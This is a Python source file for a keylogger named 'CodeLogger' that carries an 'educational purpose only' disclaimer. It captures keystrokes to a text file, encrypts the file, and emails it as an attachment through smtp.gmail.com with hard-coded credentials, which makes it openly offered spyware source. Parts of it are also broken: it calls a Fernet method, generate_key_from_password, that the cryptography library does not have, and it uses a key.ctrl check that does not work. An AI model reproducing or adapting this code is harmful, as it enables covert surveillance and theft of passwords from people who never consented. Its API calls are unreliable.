import os, platform, sys
import time
from pynput.keyboard import Key, Controller, Listener, KeyCode
import cryptography.fernet
import smtplib
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import threading

# Terminal header settings and information
os.system('color 0A')
print("Developer   :   KARTHIK LAL (https://karthiklal.in)")
print("Created Date:   2023-10-12")
print('Project     :   CodeLogger')
print('Purpose     :   A keylogger that sends the output file as an email attachment')
print('Caution     :   This tool is only for educational purpose. Do not use this for illegal purposes.')
print()

# Initializing variables
keys = []
count = 0
file_name = "key.txt"
password = b"password" # The password to encrypt and decrypt the file
email = "example@gmail.com" # The email address to send the file to
# The email server settings
server = "smtp.gmail.com"
port = 587
user = "example@gmail.com"
pwd = "password"

# Checking if file exists
while os.path.isfile(file_name):
    count += 1
    file_name = f"key{count}.txt"

# Function to write to file
def write_to_file(key):
    global keys, count

    keys.append(key)
    if len(keys) >= 10:
        with open(file_name, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                # If the key is a space, write a newline character to the file
                if k.find("space") > 0:
                    f.write("\n")
                # If the key is not a special key, write it to the file
                elif k.find("Key") == -1:
                    f.write(k)

            keys = []

# Function to encrypt the file
def encrypt_file():
    global file_name, password

    # Generate a key from the password
    key = cryptography.fernet.Fernet.generate_key_from_password(password)
    # Create a Fernet object
    fernet = cryptography.fernet.Fernet(key)
    # Read the file contents
    with open(file_name, "rb") as f:
        data = f.read()
    # Encrypt the data
    encrypted = fernet.encrypt(data)
    # Write the encrypted data to the file
    with open(file_name, "wb") as f:
        f.write(encrypted)

# Function to decrypt the file
def decrypt_file():
    global file_name, password

    # Generate a key from the password
    key = cryptography.fernet.Fernet.generate_key_from_password(password)
    # Create a Fernet object
    fernet = cryptography.fernet.Fernet(key)
    # Read the file contents
    with open(file_name, "rb") as f:
        data = f.read()
    # Decrypt the data
    decrypted = fernet.decrypt(data)
    # Write the decrypted data to the file
    with open(file_name, "wb") as f:
        f.write(decrypted)

# Function to send the file as an email attachment
def send_email():
    global file_name, email, server, port, user, pwd

    # Create a MIMEText object with the email body
    msg = MIMEText("This is the keylogger output file")
    # Set the email subject, from, and to
    msg["Subject"] = "Keylogger output"
    msg["From"] = user
    msg["To"] = email
    # Create a MIMEBase object with the file attachment
    part = MIMEBase("application", "octet-stream")
    # Read the file contents
    with open(file_name, "rb") as f:
        part.set_payload(f.read())
    # Encode the file as base64
    encoders.encode_base64(part)
    # Add the file name as a header
    part.add_header("Content-Disposition", f"attachment; filename={file_name}")
    # Attach the file to the email
    msg.attach(part)
    # Create a SMTP connection
    s = smtplib.SMTP(server, port)
    # Start TLS encryption
    s.starttls()
    # Login to the email server
    s.login(user, pwd)
    # Send the email
    s.sendmail(user, email, msg.as_string())
    # Close the connection
    s.quit()

# Function to check OS type
def check_os():
    # Check if the operating system is Windows or Linux
    if platform.system() == "Windows":
        return "win"
    else:
        return "lin"

# Function to check key press event
def on_press(key):
    try:
        write_to_file(key)
    except Exception as e:
        print(f"Error: {e}")

# Function to check key release event
def on_release(key):
    # If the 'Ctrl+Z' key combination is pressed, encrypt the file, send the email, stop logging and exit the program
    if hasattr(key, 'vk') and key.vk == KeyCode.from_char('Z').vk and key.ctrl:
        encrypt_file()
        send_email()
        sys.exit()

# Function to run the keylogger
def run_keylogger():
    # Checking OS type
    os_type = check_os()

    # Starting listener
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Main function
def main():
    print("Starting CodeLogger....")
    print("Press 'Ctrl+Z' to stop logging...")

    # Create and start a thread with the keylogger function as the target
    t = threading.Thread(target=run_keylogger)
    t.start()

if __name__ == "__main__":
    main()
